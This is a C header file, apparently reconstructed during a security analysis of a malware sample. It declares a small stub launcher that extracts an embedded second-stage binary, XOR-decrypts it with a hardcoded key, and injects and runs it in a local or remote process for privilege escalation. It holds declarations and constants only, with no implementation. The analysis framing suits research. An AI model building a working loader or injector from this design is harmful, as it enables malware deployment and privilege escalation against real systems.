/**
 * PE #4 - Stub Launcher Header
 * 
 * RECONSTRUCTED FROM SECURITY ANALYSIS
 * Classification: TLP:RED - Security Research Only
 * 
 * PE #4 is a minimal 3KB launcher/stub that:
 * 1. Extracts PE #5 from embedded data
 * 2. Decrypts PE #5 (XOR key 0x55)
 * 3. Injects PE #5 into current or target process
 * 4. Executes PE #5 privilege escalation
 * 
 * Key properties:
 * - Size: 3,045 bytes
 * - Encryption: XOR with key 0x55
 * - Purpose: Rapid PE #5 deployment
 */

#ifndef PE4_STUB_H
#define PE4_STUB_H

#include <windows.h>

//=============================================================================
// CONFIGURATION
//=============================================================================

// PE #4 properties
#define PE4_SIZE                3045        // Total stub size
#define PE4_XOR_KEY             0x55        // Hardcoded XOR key

// PE #5 embedded at specific offset within PE #4
#define PE5_EMBEDDED_OFFSET     0x200       // Offset to embedded PE #5
#define PE5_EMBEDDED_SIZE       22702       // Size of PE #5

// Injection methods
typedef enum _INJECTION_METHOD {
    INJECT_SELF = 0,                        // Inject into current process
    INJECT_REMOTE,                          // Inject into remote process
    INJECT_SHELLCODE                        // Direct shellcode execution
} INJECTION_METHOD;

//=============================================================================
// FUNCTION DECLARATIONS
//=============================================================================

/**
 * Main stub entry point.
 * Extracts and executes PE #5.
 */
DWORD WINAPI 
PE4_StubMain(
    LPVOID lpParameter
);

/**
 * Decrypt PE #4 stub (self-decryption).
 */
BOOL 
PE4_Decrypt(
    PBYTE   Buffer,
    DWORD   Size
);

/**
 * Extract embedded PE #5 from PE #4.
 */
PBYTE 
PE4_ExtractPE5(
    PBYTE   StubBase,
    PDWORD  PE5Size
);

/**
 * Inject PE #5 into target process.
 */
BOOL 
PE4_InjectPE5(
    HANDLE  hProcess,
    PBYTE   PE5Data,
    DWORD   PE5Size,
    INJECTION_METHOD Method
);

/**
 * Execute injected PE #5.
 */
BOOL 
PE4_ExecutePE5(
    HANDLE  hProcess,
    PVOID   RemoteBase
);

#endif // PE4_STUB_H
